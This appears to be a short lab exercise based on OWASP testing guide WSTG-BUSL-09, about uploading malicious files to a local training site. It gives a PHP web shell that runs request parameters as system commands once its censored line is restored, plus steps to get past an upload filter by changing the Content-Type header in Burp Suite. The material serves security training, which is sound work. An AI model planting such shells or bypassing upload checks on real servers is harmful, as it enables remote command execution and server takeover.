Testing Upload of Malicious Files

1) Find the page for WSTG-BUSL-09 (Test Upload of Malicious Files on OWASP WSTG 4.1(https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.html)

2) Create a PHP payload using code following instructions in the WebShell Backdoor section of the page:

<?php
if(isset($_REQUEST['rq'])){
echo "<pre>";
$rq= ($_REQUEST['rq']);
/ *Replace CENSORED with system ($rq) to activate the sample* /
CENSORED;
echo "</pre>";
die;
}
?>

Don't forget to replace the word CENSORED with system ($rq) as noted in the instructions in the code.

1) Try to upload the payload file on http://sbva.local/contact.php

It will respond with an error message stating that only image files are allowed

1) Follow the Evasion of FIlter instructions to bypass the website file upload checking rules and filters

	1) Use Burp Suite to replace the Content-Type header value from application/x-php to image/jpeg, and forward the request.

	2) Verify the file upload bypass by visiting http://sbva.local/upload/a.php (replace a.php with the name of the payload file you created)
